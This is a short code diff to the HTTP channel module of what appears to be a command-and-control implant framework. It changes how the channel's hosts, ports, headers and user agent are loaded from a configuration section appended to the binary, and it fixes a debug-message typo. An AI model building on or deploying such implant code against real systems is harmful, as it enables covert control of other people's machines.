@@ -146,20 +146,26 @@ BOOL HttpCleanup( CHANNEL_CONTEXT* Context ) {
     return TRUE;
 }
 
-BOOL go( IImplant* Implant, IChannel* Channel, PVOID Config, DWORD ConfigSize ) {
+char __CONFIG__[0] __attribute__((section("config")));
+char * findAppendedConfig() {
+    return (char *)&__CONFIG__;
+}
+
+BOOL go( IImplant* Implant, IChannel* Channel) {
     datap            Parser;
     CHANNEL_CONTEXT* Context = NULL;
     char**           Uris    = NULL;
     char**           Headers = NULL;
     char**           Hosts   = NULL;
     unsigned short*  Ports   = NULL;
+    _RESOURCE*       Config  = (_RESOURCE *)findAppendedConfig();
 
     Context = RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( CHANNEL_CONTEXT ) );
     if (Context == NULL) {
         goto RETURN_WITH_FAILURE;
     }
 
-    Implant->BeaconDataParse( &Parser, Config, ConfigSize );
+    Implant->BeaconDataParse( &Parser, Config->value, Config->length );
     Context->Config.ID               = Implant->BeaconDataInt( &Parser );
     Context->Config.UserAgent        = strdup( Implant->BeaconDataExtract( &Parser, NULL ) );
     Context->Config.Method           = strdup( Implant->BeaconDataExtract( &Parser, NULL ) );
@@ -236,7 +242,7 @@ BOOL go( IImplant* Implant, IChannel* Channel, PVOID Config, DWORD ConfigSize ) 
     Channel->Context     = Context;
     Channel->ContextSize = sizeof( CHANNEL_CONTEXT );
 
-    DBG_PRINTF( "channel %X registred\n", Context->Config.ID );
+    DBG_PRINTF( "channel %X registered\n", Context->Config.ID );
 
     return TRUE;
 
